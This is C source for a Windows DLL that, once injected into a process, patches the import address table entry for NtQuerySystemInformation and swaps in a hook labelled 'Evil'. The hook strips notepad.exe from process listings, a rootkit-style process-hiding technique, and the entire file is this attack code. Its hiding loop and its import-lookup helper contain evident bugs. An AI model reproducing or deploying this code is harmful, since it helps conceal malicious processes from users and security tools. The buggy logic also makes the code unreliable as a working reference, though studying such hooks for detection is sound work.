#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <string.h>
#include <winternl.h>
#include <Psapi.h>
#include <TlHelp32.h>


__declspec(dllexport)

typedef struct MY_SYSTEM_PROCESS_INFORMATION {
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	LARGE_INTEGER Reserved[3];
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ImageName;
	KPRIORITY BasePriority;
	HANDLE ProcessId;
	HANDLE InheritedFromProcessId;
} MY_SYSTEM_PROCESS_INFORMATION, *PMY_SYSTEM_PROCESS_INFORMATION;

typedef NTSTATUS (__stdcall* PNT_QUERY_SYSTEM_PROCESS_INFORMATION)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength);

PNT_QUERY_SYSTEM_PROCESS_INFORMATION OriginalNtQuerySystemInformation;

NTSTATUS __stdcall EvilNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) {
	
	NTSTATUS status = OriginalNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
	if (SystemProcessInformation == SystemInformationClass)
	{
		PMY_SYSTEM_PROCESS_INFORMATION pCurrent = NULL;
		PMY_SYSTEM_PROCESS_INFORMATION pNext = (PMY_SYSTEM_PROCESS_INFORMATION)SystemInformation;
		do {
			pCurrent = pNext;
			pNext = (PMY_SYSTEM_PROCESS_INFORMATION)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
			if (!wcsncmp(pNext->ImageName.Buffer,L"notepad.exe",pNext->ImageName.Length))
				{
					if (!pNext->NextEntryOffset) {
						pCurrent->NextEntryOffset = 0;
					}
				}
		} while (pCurrent->NextEntryOffset != 0);
	}
	return status;
}

LONG* find_IAT_entery(char* requestedDLL, char* requestedFUNC) {
	void* base_address = GetModuleHandle(0);
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)base_address;
	PIMAGE_NT_HEADERS NTHeaders = (PIMAGE_NT_HEADERS)(dosHeader->e_lfanew + (char*)base_address);
	IMAGE_OPTIONAL_HEADER optionalHeader = NTHeaders->OptionalHeader;
	PIMAGE_DATA_DIRECTORY data_directory = optionalHeader.DataDirectory;
	PIMAGE_IMPORT_DESCRIPTOR import_array = data_directory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress + (char*)(base_address);
	DWORD* original_first_thunk = import_array->OriginalFirstThunk + (char*)base_address;//func name
	LONG* first_thunk = import_array->FirstThunk + (char*)(base_address);//func address
	while (import_array->Name != 0)
	{
		char* dll_name = (char*)(base_address)+import_array->Name;
		if (strcmp(requestedDLL, dll_name) == 0)
		{
			original_first_thunk = import_array->OriginalFirstThunk + (char*)base_address;//func name
			first_thunk = import_array->FirstThunk + (char*)(base_address);//func address
			int  i = 0;
			while (1) {
				DWORD funcNameRVA = *(original_first_thunk + i);
				if (funcNameRVA == 0) return -1;
				char* func_name = funcNameRVA + 2 + (char*)dosHeader;
				if (strcmp(func_name, requestedFUNC) == 0)
				{
					LONG* funcAddress = first_thunk + i;
					return funcAddress;
				}
				i++;
			}
		}
		else import_array = import_array + 1;
	}
}

BOOL APIENTRY DllMain(
	HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		//Initialize once for each new proccess
		//return False to fail DLL load
		OutputDebugStringA("injecting\n\0");
		char* ntdll = "ntdll.dll";
		char* ntQuerySystemInformation = "NtQuerySystemInformation";
		//access
		LONG* adr = find_IAT_entery(ntdll, ntQuerySystemInformation);
		LPVOID lpaddress = (LONG)adr - (LONG)adr % 0x1000;
		DWORD loldprotect = 0;
		PDWORD lpfloldprotect = &loldprotect;
		VirtualProtect(lpaddress, 0x1000, PAGE_READWRITE, lpfloldprotect);
		OriginalNtQuerySystemInformation = *adr;
		*adr = &EvilNtQuerySystemInformation;
		VirtualProtect(lpaddress, 0x1000, *lpfloldprotect, lpfloldprotect);
		OutputDebugStringA("hooked\n\0");
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		//perform any neccessary cleanup
		break;
	}
	return TRUE;
}